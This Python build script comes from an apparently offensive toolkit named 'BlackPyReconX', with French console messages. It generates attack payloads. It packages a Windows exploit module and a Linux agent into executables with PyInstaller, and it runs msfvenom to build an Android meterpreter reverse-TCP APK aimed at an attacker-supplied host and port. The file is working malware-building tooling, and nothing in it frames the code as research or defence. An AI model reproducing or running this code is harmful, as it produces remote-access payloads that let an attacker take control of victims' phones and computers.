# build/packager.py

import os
import subprocess
import argparse
from pathlib import Path
import shutil
import sys

def build_executable(script_path, name="payload", onefile=True):
    cmd = [
        sys.executable, "-m", "PyInstaller",
        script_path,
        "--name", name,
        "--distpath", "build/dist",
        "--workpath", "build/build",
        "--specpath", "build/spec",
        "--clean"
    ]
    if onefile:
        cmd.append("--onefile")

    print(f"[+] Construction de {name} depuis {script_path}")
    try:
        subprocess.run(cmd, check=True)
        print(f"✅ Payload généré : build/dist/{name}.exe")
    except subprocess.CalledProcessError as e:
        print(f"❌ Échec génération avec PyInstaller : {e}")
        sys.exit(1)

def copy_script(source_path: Path, output_name: str):
    output_dir = Path("build/dist")
    output_dir.mkdir(parents=True, exist_ok=True)
    output_file = output_dir / f"{output_name}.sh"
    shutil.copy(source_path, output_file)
    print(f"✅ Script copié : {output_file}")

def build_android_payload(lhost: str, lport: str):
    output_path = Path("agents/android/payload.apk")
    output_path.parent.mkdir(parents=True, exist_ok=True)

    print(f"[+] Génération payload Android (.apk) avec LHOST={lhost} LPORT={lport}")

    cmd = [
        "msfvenom",
        "-p", "android/meterpreter/reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-o", str(output_path)
    ]

    try:
        subprocess.run(cmd, check=True)
        print(f"✅ Payload Android généré : {output_path}")
    except subprocess.CalledProcessError as e:
        print(f"❌ Échec génération avec msfvenom : {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="🔧 Générateur de payloads BlackPyReconX")
    parser.add_argument("--target", choices=["windows", "android", "unix"], required=True,
                        help="Cible de génération de payload")
    parser.add_argument("--lhost", help="Adresse IP pour reverse shell (Android)")
    parser.add_argument("--lport", help="Port pour reverse shell (Android)")
    args = parser.parse_args()

    base_dir = Path(__file__).resolve().parent.parent

    if args.target == "android":
        if not args.lhost or not args.lport:
            print("❌ Veuillez spécifier --lhost et --lport pour Android")
            sys.exit(1)
        build_android_payload(args.lhost, args.lport)
        return

    targets = {
        "windows": {
            "path": base_dir / "modules" / "exploit_sys.py",
            "name": "payload_windows"
        },
        "unix": {
            "path": base_dir / "agents" / "linux" / "agent_linux.py",
            "name": "payload_unix"
        }
    }

    selected = targets[args.target]
    path = selected["path"]
    name = selected["name"]

    if not path.exists():
        print(f"❌ Fichier introuvable : {path}")
        sys.exit(1)

    ext = path.suffix.lower()
    if ext == ".py":
        build_executable(str(path), name=name)
    elif ext == ".sh":
        copy_script(path, name)
    else:
        print(f"❌ Extension non prise en charge : {ext}")
        sys.exit(1)

if __name__ == "__main__":
    main()
